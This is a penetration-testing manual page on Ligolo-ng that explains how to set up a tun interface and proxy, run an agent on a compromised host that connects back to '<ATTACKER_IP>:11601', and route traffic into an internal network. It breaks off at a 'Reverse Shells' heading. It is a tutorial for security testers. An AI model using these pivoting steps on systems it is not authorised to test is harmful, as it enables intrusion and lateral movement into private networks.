---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Ligolo-ng

> **Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

{% hint style="info" %}
#### Download & Install

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
{% endhint %}

***

## Setup

In order to begin, we need to either download the precompiled binaries or compile the necessary files ourselves. The relevant files can be downloaded from the [releases page](https://github.com/nicocha30/ligolo-ng/releases/) on GitHub.

We’re going to need a **proxy file** which will be the one we use on our attacker machine and agent files for both Linux and Windows so that we have them ready to go depending on what host we compromise.

Download the appropriate proxy file for our attacker machine and architecture and some agent files for Windows x64 and Linux x64 as the most likely possible targets.

***

## Basic Usage

{% stepper %}
{% step %}
### Setup Interface

In a terminal on our attack host, navigate to where we saved and extracted the proxy file. We need to run the following commands:

{% code title="Adds a new tun interface to our machine." %}
```bash
sudo ip tuntap add user kali mode tun ligolo
```
{% endcode %}

{% code title="Enables the new interface." %}
```bash
sudo ip link set ligolo up
```
{% endcode %}
{% endstep %}

{% step %}
### Run the Proxy File

We are now ready to run our proxy file.

```bash
./proxy -selfcert
```

{% hint style="success" %}
With the `-selfcert` flag the tool dynamically generates self-signed certificates.
{% endhint %}

Once you run this, the tool will start listening at port `11601` on all interfaces and you will get access to the tool’s command line.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Transfer the Agent

Now we need to transfer the appropriate agent file to the host we’ve compromised using our preferred method of choice. See [file-transfer](../../../field-manual/post-exploitation/file-transfer/ "mention") for more information.
{% endstep %}

{% step %}
### Connection to Attacker Host

Now we can run the following command to connect back to our attacking machine:

```bash
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

{% hint style="info" %}
The `-ignore-cert` ignores certificate validation. This means we won't have any issues with our self-signed certs.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

It may take a second for the connection to be established and when it is, we will see that an agent has joined.

{% hint style="info" %}
We can type `help` to access the help menu and check out what options are available.
{% endhint %}
{% endstep %}

{% step %}
### Select the Session

Now we can type `session` in ligolo-ng’s interface, this will list all our sessions and we can specify the one we want either by number or using the arrow keys.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Add Route to Interface

In our scenario, we want to access the `172.16.5.0/24` network, so we need to open a new terminal and add the corresponding route to our ligolo-ng interface with the following command:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

We can confirm that the route has been added by typing ip route list.
{% endstep %}

{% step %}
### Start the Tunnel

Going back to ligolo-ng we can now type `start`which will start a tunnel.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We can now access the network, but in order to catch reverse shells, do file transfers and move further into the network we’re going to have to add some listeners.
{% endstep %}
{% endstepper %}

***

## Reverse Shells

